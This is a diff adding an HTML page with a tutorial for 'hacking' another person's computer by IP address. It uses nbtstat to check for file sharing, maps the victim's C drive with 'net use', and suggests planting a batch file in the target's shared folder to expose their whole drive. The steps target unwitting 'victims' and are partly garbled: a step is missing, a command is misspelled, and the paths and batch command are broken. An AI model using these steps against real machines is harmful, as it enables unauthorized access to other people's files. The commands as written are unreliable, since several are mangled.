@@ -1,0 +1,74 @@
+<html>
+<style>
+
+body{ margin:0; padding:0; 
+
+font-family: 'Open Sans', sans-serif;
+font-family: 'Slabo 27px', serif;
+}
+
+.wrapper {
+    background: #141518;
+    color: #f2f2f2;
+	padding:20px;
+}
+
+
+.para {
+    background: #34373c none repeat scroll 0 0;
+    border-radius: 10px;
+    clear: both;
+    margin-bottom: 15px;
+    margin-left: auto;
+    margin-right: auto;
+    max-width: 900px;
+    overflow: hidden;
+    padding: 0 20px;
+}
+
+.para h2 {
+    font-size: 30px;
+}
+.para  p {
+    font-size: 16px;
+	line-height:24px;
+}
+
+
+.ul-title {
+    font-size: 20px;
+    font-weight: bold;
+}
+
+/*.wrapper p{ margin:0;}
+*/
+
+</style>
+
+<body>
+<div class="wrapper">
+<div class="para">
+<p><strong>Hack some other computer remotely using their IP address</strong></p>
+<p><strong>Step 1:</strong><br /> Now Go to Star and click Run and then type as &ldquo;CMD&rdquo; and hit enter.<br /> command prompt will open.</p>
+<p><strong>Step 2:</strong><br /> Type in cmd as &ldquo;<strong>nbtstat -a IPaddressOfVictim&rdquo;&nbsp; </strong>and hit enter.</p>
+<p>(use <strong>ping</strong> command to know victim ipaddress)</p>
+<p>For eg:</p>
+<p>nbstat -a 223.222.222.222</p>
+<p>If you see this your in&nbsp;<strong>NetBIOS Remote Machine Name Table</strong></p>
+<p><strong>Name Type Status </strong><br /> user&lt;00&gt; UNIQUE Registered<br /> workgroup &lt;00&gt; GROUP Registered<br /> user &lt;03&gt; UNIQUE Registered<br /> user &lt;20&gt; UNIQUE Registered</p>
+<p><strong>MAC Address</strong> = <strong>xx-xx-xx-xx-xx-xx </strong><br /><br /></p>
+<p>If you don&rsquo;t get the number <strong>&lt;20&gt;. </strong><br /> The victim disabled the File And Printer Sharing, find &nbsp;another victim.</p>
+<p><strong>&nbsp;Step 4:</strong><br /> Now type as&nbsp; &ldquo;net use x: \IPaddressOfVictimCDISK&rdquo; and hit enter&gt;</p>
+<p>replace with ip address of vitim in the place of&nbsp; &ldquo;IPaddressOfVictim.<br /> You can give any letter instead of &lsquo;x&rsquo;.</p>
+<p>For eg:<br /> net use x:\223.222.222.222CDISK</p>
+<p><strong>Step 5:</strong><br /> Now open windows explorer or just double click on the My Computer icon on your<br /> desktop and you will see a new network drive</p>
+<p>Now open windows explorer or just double click on the My Computer icon on your<br /> desktop and you will see a new network drive X:.</p>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This hack will only work if you have the ip of someone on your network. It will not work if the ip of the person you want to &ldquo;hack&rdquo; is not on your network.</div>
+<div>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If you can only access your targets shared folder put a batch file in their shared folder with the command C=C if they open it,it will share their hardrive.</div>
+</div>
+</div>
+</body>
+</html>
+
+
+
